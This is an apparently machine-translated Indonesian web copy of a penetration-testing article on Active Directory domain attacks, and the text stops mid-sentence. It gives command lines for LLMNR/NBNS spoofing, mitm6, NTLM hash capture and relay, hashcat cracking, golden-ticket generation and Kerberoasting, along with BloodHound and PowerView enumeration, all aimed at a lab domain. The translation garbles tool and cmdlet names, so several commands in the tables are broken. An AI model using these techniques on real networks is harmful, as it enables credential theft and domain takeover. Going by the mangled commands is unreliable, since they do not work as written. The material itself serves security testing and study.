<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>📫 🐤 🕯️ Serangan Domain 🚵🏼 ✨ 🤲</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Saat melakukan pengujian penetrasi, kami cukup sering mendeteksi kesalahan dalam konfigurasi domain. Meskipun ini tampaknya tidak penting bagi banyak ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Serangan Domain</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/jetinfosystems/blog/449278/"><img src="https://habrastorage.org/webt/om/yi/ln/omyiln4hxyukdu7znc3sn5j-mzy.png"><br>  Saat melakukan pengujian penetrasi, kami cukup sering mendeteksi kesalahan dalam konfigurasi domain.  Meskipun ini tampaknya tidak penting bagi banyak orang, pada kenyataannya, ketidakakuratan semacam itu dapat menyebabkan seluruh domain dikompromikan. <br><br>  Sebagai contoh, menurut hasil dari pentest dalam satu perusahaan, kami sampai pada kesimpulan bahwa semua mesin yang tersedia di domain tidak lebih rendah dari Windows10 / Windows Server2016, dan mereka memiliki semua tambalan terbaru pada mereka.  Jaringan dipindai secara teratur, mesin-mesinnya keras.  Semua pengguna duduk melalui token dan tidak tahu "kata sandi 20 karakter" mereka.  Semuanya tampak baik-baik saja, tetapi IPv6 belum dinonaktifkan.  Skema penangkapan domain tampak seperti ini: <br><br>  mitm6 -&gt; ntlmrelay -&gt; serangan melalui delegasi -&gt; kata sandi administrator lokal diterima -&gt; kata sandi administrator domain diterima. <br><br>  Sayangnya, sertifikasi populer seperti OSCP, GPEN, atau CEH tidak mengajarkan pengujian penetrasi Active Directory. <br><br>  Pada artikel ini, kita akan melihat beberapa jenis serangan Direktori Aktif yang kami lakukan sebagai bagian dari pentest, serta alat yang digunakan.  Ini sama sekali tidak dapat dianggap sebagai panduan lengkap untuk semua jenis serangan dan alat, benar-benar ada banyak, dan sulit untuk masuk ke dalam satu artikel. <br><br>  Jadi, untuk demonstrasi, kami menggunakan laptop di Kali Linux 2019 dan virtual host dibesarkan di VMware.  Bayangkan bahwa tujuan utama pentest adalah untuk mendapatkan hak administrator domain, dan sebagai masukan kita memiliki akses ke jaringan perusahaan perusahaan melalui ethernet.  Untuk mulai menguji domain, kami memerlukan akun. <br><a name="habracut"></a><br><h1>  Mendapatkan akun </h1><br>  Pertimbangkan dua metode yang paling umum, menurut saya, untuk mendapatkan login dan kata sandi akun domain: LLMNR / NBNS spoofing dan menyerang protokol IPv6. <br><br><h3>  LLMNR / NBNS Spoofing </h3><br>  Sudah banyak yang dikatakan tentang serangan ini.  Intinya adalah bahwa klien mengirimkan LLMNR multicast dan menyiarkan permintaan NBT-NS untuk menyelesaikan nama host jika ini tidak mungkin melalui DNS.  Setiap pengguna jaringan dapat menjawab permintaan tersebut. <br><br>  Alat yang memungkinkan serangan: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Tanggapan</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Inveight</a> </li><li>  Modul Metasploit: auxiliary / spoof / llmnr / llmnr_response, auxiliary / spoof / nbns / nbns_response, <br>  tambahan / server / tangkap / seseorang, tambahan / server / tangkap / http_ntlm </li></ul><br>  Dengan serangan yang berhasil, kita bisa mendapatkan hash NetNTLM dari kata sandi pengguna. <br><br><pre><code class="bash hljs">Responder -I eth0 -wrf</code> </pre> <br><img src="https://habrastorage.org/webt/ul/6f/1r/ul6f1rsc1dbtugnzoiup43cofnc.png"><br><br>  Hash yang dihasilkan, kita dapat men-debug atau menjalankan relai NTLM. <br><br><h3>  Serangan IPv6 </h3><br>  Jika IPv6 digunakan dalam jaringan perusahaan, kami dapat menanggapi permintaan DHCPv6 dan menetapkan alamat IP kami sebagai server DNS pada mesin yang diserang.  Karena IPv6 lebih diutamakan daripada IPv4, permintaan DNS klien akan dikirim ke alamat kami.  Baca lebih lanjut tentang serangan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br><br>  Alat: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mitm6</a> </li></ul><br>  Menjalankan utilitas mitm6 <br><br><pre> <code class="bash hljs">mitm6 -i vmnet0</code> </pre> <br>  Setelah serangan selesai, server DNS baru dengan alamat IPv6 kami akan muncul di workstation yang diserang. <br><br><img src="https://habrastorage.org/webt/ww/w4/w3/www4w3x2eqtuytsmysia_deoi_y.png"><br><br>  Mesin yang diserang akan mencoba mengautentikasi dengan mesin kami.  Setelah mengangkat server SMB menggunakan utilitas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">smbserver.py</a> , kita bisa mendapatkan hash kata sandi pengguna. <br><br><pre> <code class="bash hljs">smbserver.py -smb2support SMB /root/SMB</code> </pre> <br><img src="https://habrastorage.org/webt/df/s8/jx/dfs8jxcdecrikctqxdxzbuyq8wk.png"><br><br><h2>  Tindakan Hash yang Ditangkap </h2><br>  Langkah selanjutnya adalah melakukan serangan kriptografis pada hash kata sandi dan mendapatkan kata sandi dalam teks yang jelas, atau melakukan relai NTLM. <br><br><h3>  Kata sandi brute force </h3><br>  Sederhana: ambil kata sandi hash, hashcat <br><br><pre> <code class="bash hljs">hashcat -m 5600 -a 3 hash.txt /usr/share/wordlists/rockyou.txt</code> </pre> <br>  dan brutus.  Kata sandi dapat diperoleh atau tidak :) <br><br><img src="https://habrastorage.org/webt/pf/l8/7g/pfl87glgjcfbove5ywlkmul1uyi.png"><br>  <i>Kata sandi pengguna Harvey telah dipulihkan - Pbvf2019</i> <br><br><h3>  Relay NTLM </h3><br>  Kami juga dapat menjalankan relay NTLM.  Setelah memastikan bahwa <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Penandatanganan SMB</a> tidak digunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">, kami</a> menggunakan utilitas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ntlmrelayx.py</a> dan melakukan serangan.  Di sini lagi, tergantung pada tujuannya, kami memilih vektor yang kami butuhkan.  Mari kita pertimbangkan beberapa di antaranya. <br><br><br><h4>  Akses ke mesin yang diserang melalui protokol SMB </h4><br>  Lakukan serangan dengan kunci <i>i</i> . <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t 192.168.1.5 -l loot -i</code> </pre> <br><img src="https://habrastorage.org/webt/jk/3w/zu/jk3wzuzoxwr2qnrzhagq7bnweya.png"><br><br>  Dengan serangan yang berhasil, kita dapat terhubung ke mesin jarak jauh menggunakan netcat. <br><br><img src="https://habrastorage.org/webt/1f/8x/ba/1f8xbajj3gofx2bonp0quqdnxae.png"><br><br><h4>  Pengumpulan Informasi Domain </h4><br>  Dalam hal ini, kami melakukan relai ke pengontrol domain. <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t ldap://192.168.1.2</code> </pre> <br>  Jika serangan berhasil, kami akan mendapatkan informasi terperinci tentang domain: <br><br><img src="https://habrastorage.org/webt/el/gf/eu/elgfeumon83qjseesppzb8yjitq.png"><br><br><h4>  Menambahkan komputer baru ke domain </h4><br>  Setiap pengguna secara default memiliki kemampuan untuk membuat hingga 10 komputer dalam domain tersebut.  Untuk membuat komputer, Anda perlu merelay ke pengontrol domain menggunakan protokol ldaps.  Membuat pengguna dan komputer melalui koneksi ldap yang tidak terenkripsi dilarang.  Selain itu, akun tidak dapat dibuat jika koneksi melalui SMB dicegat. <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t ldaps://192.168.1.2 --add-computer</code> </pre> <br><img src="https://habrastorage.org/webt/ei/xe/qi/eixeqiuxwttuxx3xmmroqrj8smy.png"><br><br>  Seperti yang Anda lihat pada gambar, kami dapat membuat komputer RORYOTGS $. <br><br>  Saat membuat lebih dari 10 komputer, kami mendapatkan kesalahan dari formulir berikut: <br><br><img src="https://habrastorage.org/webt/gb/za/ar/gbzaarxwpzhs0zhy4zi8kvwuqjo.png"><br><br>  Dengan menggunakan kredensial komputer RORYOTGS $, kami dapat melakukan permintaan yang sah ke pengontrol domain. <br><br><h1>  Pengumpulan Informasi Domain </h1><br>  Jadi, kami memiliki pengguna domain atau akun komputer.  Untuk melanjutkan pengujian, kami perlu mengumpulkan informasi yang tersedia untuk perencanaan serangan lebih lanjut.  Pertimbangkan beberapa alat yang akan membantu kami menentukan pencarian untuk sistem yang paling kritis, merencanakan dan melaksanakan serangan. <br><br><h3>  Anjing pelacak </h3><br>  Salah satu alat paling penting yang digunakan di hampir semua pengujian penetrasi internal.  Proyek ini secara aktif mengembangkan dan dilengkapi dengan fitur-fitur baru. <br><br><div class="spoiler">  <b class="spoiler_title">Informasi dikumpulkan oleh anjing pelacak</b> <div class="spoiler_text"><ul><li>  Grup - Melakukan pengumpulan keanggotaan grup </li><li>  LocalAdmin - Melakukan pengumpulan admin lokal </li><li>  RDP - Melakukan pengumpulan Pengguna Remote Desktop </li><li>  DCOM - Melakukan pengumpulan COM Users Terdistribusi </li><li>  GPOLocalGroup - Melakukan pengumpulan admin lokal menggunakan Objek Kebijakan Grup </li><li>  Session - Melakukan pengumpulan sesi </li><li>  ComputerOnly - Melakukan admin lokal, RDP, DCOM, dan koleksi sesi </li><li>  LoggedOn - Melakukan pengumpulan sesi istimewa (membutuhkan hak admin pada sistem target) </li><li>  Trusts - Melakukan enumerasi kepercayaan domain </li><li>  ACL - Melakukan pengumpulan ACL </li><li>  Wadah - Melakukan pengumpulan Kontainer; </li><li>  DcOnly - Melakukan pengumpulan menggunakan LDAP saja.  Termasuk Grup, Trust, ACL, ObjectProps, Container, dan GPOLocalGroup </li><li>  Semua - Melakukan semua Metode Pengumpulan kecuali GPOLocalGroup dan LoggedOn </li><li>  Hutan Pencarian - Cari semua domain di hutan, bukan hanya domain Anda saat ini </li><li>  Domain - Cari domain tertentu.  Menggunakan domain Anda saat ini jika nol (Default: null) </li><li>  Stealth - Melakukan metode pengumpulan siluman.  Semua opsi siluman berulir tunggal </li><li>  SkipGCDeconfliction - Abaikan dekonfigurasi Katalog Global selama enumerasi sesi.  Ini dapat mempercepat pencacahan, tetapi akan menghasilkan kemungkinan ketidakakuratan dalam data </li><li>  ExcludeDc - Tidak termasuk pengontrol domain dari pencacahan (menghindari bendera ATA Microsoft) </li><li>  ComputerFile - Menentukan file untuk memuat nama / IP komputer dari </li><li>  OU - Tentukan OU mana yang akan dihitung </li></ul><br></div></div><br>  Pengumpul informasi adalah <a href="">SharpHound.exe</a> (harus diinstal. NET v3.5) dan skrip <a href="">SharpHound.ps1</a> ditulis dalam PowerShell.  Ada juga kompiler yang ditulis oleh pengembang Python pihak ketiga, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bloodhound-python</a> . <br><br>  Sebagai basis data, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Neo4j</a> digunakan, yang memiliki sintaksnya sendiri, yang memungkinkan Anda untuk melakukan kueri khusus.  Anda dapat membaca lebih lanjut tentang sintaks di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Di luar kotak 12 permintaan tersedia</b> <div class="spoiler_text"><ul><li>  Temukan semua Admin Domain </li><li>  Temukan Jalur Terpendek ke Admin Domain </li><li>  Temukan Kepala Sekolah dengan Hak DCSync </li><li>  Pengguna dengan Keanggotaan Grup Domain Asing </li><li>  Grup dengan Keanggotaan Grup Domain Asing </li><li>  Peta trust domain </li><li>  Jalur Terpendek ke Sistem Delegasi Tanpa Batas </li><li>  Jalur Terpendek dari Pengguna Kerberoastable </li><li>  Jalur Terpendek ke Admin Domain dari Pengguna Kerberoastable </li><li>  Jalur Terpendek dari Kepala Sekolah Milik </li><li>  Jalur Terpendek ke Admin Domain dari Kepala Sekolah Milik </li><li>  Jalur Terpendek ke Target Nilai Tinggi </li></ul><br></div></div><br>  Pengembang juga menyediakan skrip <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">DBCreator.py</a> , yang memungkinkan Anda membuat basis data acak untuk pengujian. <br><br><img src="https://habrastorage.org/webt/do/if/95/doif95xzpkhd3xqbdjbwdenmrfu.png"><br><br>  Neo4j memiliki API REST.  Ada berbagai utilitas yang dapat terhubung ke database dan menggunakan data yang diterima: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Cypherdog</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Ambil</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ANGRYPUPPY</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">gt-generator</a> </li></ul><br>  Mari kita pertimbangkan beberapa di antaranya. <br><br><h3>  Cypherdog </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">CypherDog</a> adalah cangkang BloodHound yang ditulis dengan PowerShell.  Termasuk 27 cmdlet. <br><br><div class="spoiler">  <b class="spoiler_title">Daftar Cmdlet</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Cmdlet </td><td>  Sinopsis </td></tr><tr><td>  Dapatkan-BloodHoundCmdlet </td><td>  BloodHound RTFM - Dapatkan Cmdlet </td></tr><tr><td>  Kirim-anjing pelacak </td><td>  BloodHound POST - Cypher to REST API </td></tr><tr><td>  Dapatkan-BloodHoundNode </td><td>  BloodHound Node - Dapatkan Node </td></tr><tr><td>  Cari-BloodHoundNode </td><td>  BloodHound Node - Cari Node </td></tr><tr><td>  New-BloodHoundNode </td><td>  BloodHound Node - Buat Node </td></tr><tr><td>  Set-bloodhoundnode </td><td>  BloodHound Node - Perbarui Node </td></tr><tr><td>  Hapus-BloodHoundNode </td><td>  BloodHound Node - Hapus Node </td></tr><tr><td>  Dapatkan-BloodHoundNodeList </td><td>  BloodHound Node - Dapatkan Daftar </td></tr><tr><td>  Dapatkan-BloodHoundNodeHighValue </td><td>  BloodHound Node - Dapatkan Nilai Tinggi </td></tr><tr><td>  Dapatkan-BloodHoundNodeOwned </td><td>  BloodHound Node - Dapatkan Milik </td></tr><tr><td>  Dapatkan-BloodHoundNodeNote </td><td>  BloodHound Node - Dapatkan Catatan </td></tr><tr><td>  Set-BloodHoundNodeNote </td><td>  BloodHound Node - Set Notes </td></tr><tr><td>  Dapatkan-BloodHoundBlacklist </td><td>  BloodHound Node - Dapatkan Blacklist </td></tr><tr><td>  Set-BloodHoundBlacklist </td><td>  BloodHound Node - Tetapkan Daftar Hitam </td></tr><tr><td>  Hapus-BloodHoundBlacklist </td><td>  BloodHound Node - Hapus Daftar Hitam </td></tr><tr><td>  Dapatkan-BloodHoundEdge </td><td>  BloodHound Edge - Dapatkan Target </td></tr><tr><td>  Dapatkan-BloodHoundEdgeReverse </td><td>  BloodHound Edge - Dapatkan Sumber </td></tr><tr><td>  Dapatkan-BloodHoundEdgeCrossDomain </td><td>  BloodHound Edge - Dapatkan CrossDomain </td></tr><tr><td>  Dapatkan-BloodHoundEdgeCount </td><td>  BloodHound Edge - Dapatkan Hitungan </td></tr><tr><td>  Dapatkan-BloodHoundEdgeInfo </td><td>  BloodHound Edge - Dapatkan Info </td></tr><tr><td>  New-BloodHoundEdge </td><td>  BloodHound Edge - Buat Edge </td></tr><tr><td>  Hapus-BloodHoundEdge </td><td>  BloodHound Edge - Delete Edge </td></tr><tr><td>  Dapatkan-BloodHoundPathShort </td><td>  BloodHound Path - Dapatkan Terpendek </td></tr><tr><td>  Dapatkan-BloodHoundPathAny </td><td>  BloodHound Path - Dapatkan Apa Saja </td></tr><tr><td>  Dapatkan-BloodHoundPathCost </td><td>  BloodHound Path - Dapatkan Biaya </td></tr><tr><td>  Dapatkan-BloodHoundPathCheap </td><td>  BloodHound Path - Dapatkan Yang Termurah </td></tr><tr><td>  Dapatkan-BloodHoundWald0IO </td><td>  BloodHound Path - Dapatkan Wald0 Index </td></tr></tbody></table></div><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Contoh Penggunaan</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Tim </td><td>  Deskripsi </td></tr><tr><td>  Cari-BloodHoundNode -Jenis Komputer -Properti tanpa kendala -Nilai $ true |  pilih nama, Nama layanan khusus, delegasi tidak dibatasi, sistem operasi |  Format-daftar </td><td>  Cari komputer dengan delegasi Kerberos tanpa batas </td></tr><tr><td>  Pengguna tepi ADMINISTRATOR@JET.LAB Anggota Grup </td><td>  Daftar grup pengguna </td></tr><tr><td>  Apa yang Digunakan Komputer Pengguna ADMINISTRATOR@JET.LAB </td><td>  Daftar komputer di mana ada sesi pengguna Administrator </td></tr><tr><td>  Path pengguna Komputer HARVEY@JET.LAB DC1.JET.LAB </td><td>  Cetak jalur dari pengguna ke pengontrol domain </td></tr><tr><td>  apa yang menjadi anggota Grup Member 'DOMAIN ADMINS@JET.LAB' * |  daftar masuk </td><td>  Cantumkan sesi pengguna aktif yang merupakan anggota grup Admin DOMAIN </td></tr><tr><td>  apa yang menjadi anggota Grup Member 'DOMAIN ADMINS@JET.LAB' |  daftar masuk |?  operat * -match 7 |  daftar AdminTo |  pilih nama </td><td>  Daftar pengguna yang memiliki hak administrator pada workstation yang menjalankan Windows 7 yang memiliki sesi pengguna dari grup administrator domain </td></tr></tbody></table></div><br></div></div><br>  Secara default, otentikasi diperlukan untuk mengakses database neo4j.  Anda dapat menonaktifkan otentikasi dengan mengedit file neo4j.conf.  Perlu menghapus tanda komentar pada baris <i>dbms.security.auth_enabled = false.</i>  Tapi ini tidak disarankan, karena setiap pengguna dapat terhubung ke database di 127.0.0.1:7474 (konfigurasi default).  Anda dapat membaca lebih lanjut tentang otentikasi dan otorisasi di neo4j di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini.</a> <br><br><h3>  Ambil </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">GoFetch</a> menggunakan grafik yang dibuat dalam bloodhound untuk merencanakan dan mengeksekusi serangan. <br><br><div class="spoiler">  <b class="spoiler_title">Contoh grafik Bloodhound</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/l3/pm/g_/l3pmg_9fw8yy5dkbrftpfq4flyo.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Logika GoFetch</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ph/g-/us/phg-usiezxoh0-jz2zvfq4iack8.jpeg"><br></div></div><br>  Peluncuran serangan <br><br><pre> <code class="bash hljs">.\Invoke-GoFetch.ps1 -PathToGraph .\pathFromBloodHound.json</code> </pre> <br><h3>  gt-generator </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">gt-generator</a> , menggunakan data BloodHound, membuatnya mudah untuk membuat tiket emas.  Untuk menerima tiket emas, hanya hash nama pengguna dan kata sandi pengguna KRBTGT yang diperlukan. <br><br><pre> <code class="bash hljs">python gt-generator.py -s 127.0.0.1 -u user -p pass administrator &lt;KRBTGT_HASH&gt;</code> </pre> <br><img src="https://habrastorage.org/webt/oo/d3/b8/ood3b84ooqbwwawb-pn7nybey_s.png"><br><br><h3>  Powerview </h3><br>  <a href="">PowerView</a> adalah kerangka kerja Powershell yang disertakan dengan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PowerSploit</a> .  Berikut ini adalah daftar beberapa cmdlet yang dapat membantu Anda mengumpulkan informasi tentang domain. <br><br><div class="spoiler">  <b class="spoiler_title">Daftar Cmdlet</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Dapatkan-NetDomain -Domain jet.lab </td><td>  Dapatkan domain saat ini </td></tr><tr><td>  Dapatkan-domainSID </td><td>  Dapatkan SID domain saat ini </td></tr><tr><td>  Dapatkan-NetDomainController -Domain jet.lab </td><td>  Dapatkan pengontrol domain untuk domain </td></tr><tr><td>  Dapatkan-NetUser -Domain jet.lab -UserName labuser </td><td>  Dapatkan pengguna domain </td></tr><tr><td>  Dapatkan-NetGroup * group_name * </td><td>  Dapatkan semua grup di domain saat ini </td></tr><tr><td>  Get-NetGroupMember -GroupName "Admin Domain" </td><td>  Dapatkan semua anggota grup Admin Domain </td></tr><tr><td>  Get-NetGroup -UserName "domain_user" </td><td>  Dapatkan keanggotaan grup untuk pengguna </td></tr><tr><td>  Dapatkan-NetComputer -FullData </td><td>  Dapatkan semua komputer dari domain </td></tr><tr><td>  Temukan-LocalAdminAccess -Verbose </td><td>  Temukan semua mesin di domain saat ini di mana pengguna saat ini memiliki akses admin lokal </td></tr><tr><td>  Dapatkan-NetSession -ComputerName dc02.jet.lab </td><td>  Daftar Sesi di komputer tertentu </td></tr><tr><td>  Invoke-UserHunter -CheckAccess </td><td>  Temukan komputer tempat admin domain masuk dan pengguna saat ini memiliki akses </td></tr></tbody></table></div><br></div></div><br><h3>  Adidnsdump </h3><br>  Saat menggunakan DNS terintegrasi di Active Directory, setiap pengguna domain dapat meminta semua catatan DNS default. <br><br>  Alat yang Digunakan: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Adidnsdump.</a> <br><br><img src="https://habrastorage.org/webt/hq/48/rb/hq48rboxepskftc5tnlbsnvgfr0.gif"><br><br><h1>  Serangan Domain </h1><br>  Sekarang kami memiliki informasi domain, kami beralih ke fase berikutnya dari pengujian penetrasi - langsung ke serangan.  Pertimbangkan 4 vektor potensial: <br><br><ol><li>  Memanggang </li><li>  Serang melalui ACL </li><li>  Delegasi Kerberos </li><li>  Menyalahgunakan Izin GPO </li></ol><br><br><h3>  Memanggang </h3><br>  Jenis serangan ini menargetkan protokol Kerberos.  Ada 2 jenis serangan seperti Roasting: <br><br><ul><li>  Kerberoast </li><li>  Asreproast </li></ul><br><h4>  Kerberoast </h4><br>  Serangan itu pertama kali ditunjukkan oleh pengguna <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">timmedin</a> di DerbyCon pada 2014 ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">video</a> ).  Dengan serangan yang berhasil, kami akan dapat memilah kata sandi layanan USG dalam mode offline, tanpa takut memblokir pengguna.  Cukup sering, akun layanan memiliki hak berlebihan dan kata sandi abadi, yang memungkinkan kami untuk mendapatkan hak administrator domain. <br>  Untuk memahami inti dari serangan itu, pertimbangkan cara kerja Kerberos. <br><br><img src="https://habrastorage.org/webt/vj/g2/ud/vjg2ud1wzdr89drnazgcob0eaum.png"><br><br>  1. Kata sandi dikonversi ke hash NTLM, cap waktu dienkripsi dengan hash dan dikirim ke KDC sebagai autentikator dalam permintaan tiket TGT (AS-REQ).  Pengontrol domain (KDC) memeriksa informasi pengguna dan membuat tiket TGT. <br><br>  2. Tiket TGT dienkripsi, ditandatangani, dan dikirim ke pengguna (AS-REP).  Hanya layanan Kerberos (KRBTGT) yang dapat membuka dan membaca data dari tiket TGT. <br><br>  3. Pengguna mengirimkan tiket TGT ke pengontrol domain berdasarkan permintaan tiket TGS (TGS-REQ).  Pengontrol domain membuka tiket TGT dan memeriksa checksum PAC. <br><br>  4. Tiket TGS dienkripsi dengan hash NTLM dari kata sandi akun layanan dan dikirim ke pengguna (TGS-REP). <br><br>  5. Pengguna menyediakan tiket TGS ke komputer tempat layanan berjalan (AP-REQ).  Layanan membuka tiket TGS menggunakan hash NTLM-nya. <br><br>  6. Akses ke layanan disediakan (AS-REP). <br><br>  Setelah menerima tiket TGS (TGS-REP), kami dapat menemukan kata sandi untuk akun layanan offline.  Misalnya, menggunakan hashcat. <br><br>  Menurut <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">RFC396</a> , 20 jenis enkripsi dicadangkan untuk protokol Kerberos.  Jenis-jenis enkripsi yang digunakan sekarang, dengan urutan prioritas: <br><br><ul><li>  AES256_CTS_HMAC_SHA1 </li><li>  AES128_CTS_HMAC_SHA1 </li><li>  RC4_HMAC_MD5 </li></ul><br>  Dalam versi Windows terbaru, enkripsi AES digunakan secara default.  Tetapi untuk kompatibilitas dengan sistem di bawah Windows Vista dan Windows 2008 server, dukungan untuk algoritma RC4 diperlukan.  Saat melakukan serangan, upaya selalu dilakukan terlebih dahulu untuk mendapatkan tiket TGS dengan enkripsi RC4_HMAC_MD5, yang memungkinkan kata sandi yang lebih cepat untuk disortir, dan kemudian dengan sisanya.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Harmj0y</a> melakukan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">penelitian yang</a> menarik dan menemukan bahwa jika Anda hanya menentukan dukungan enkripsi Kerberos AES128 dan AES256 di properti pengguna, tiket Kerberos masih dikeluarkan dengan enkripsi RC4_HMAC_MD5. <br><br><img src="https://habrastorage.org/webt/el/4w/vn/el4wvniixybekufn7jswfcr7pey.png"><br><br>  Menonaktifkan RC4_HMAC_MD5 diperlukan di tingkat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">domain.</a> <br><br>  Serangan Kerberoasting memiliki 2 pendekatan. <br><br>  1. Metode lama.  Tiket TGS diminta melalui setspn.exe atau .NET System.IdentityModel.Tokens.KerberosRequestorSecurityToken dari kelas Powershell, diambil dari memori menggunakan mimikatz, kemudian dikonversi ke format yang diinginkan (John, Hashcat) dan disortir. <br><br>  2. Metode baru.  <a 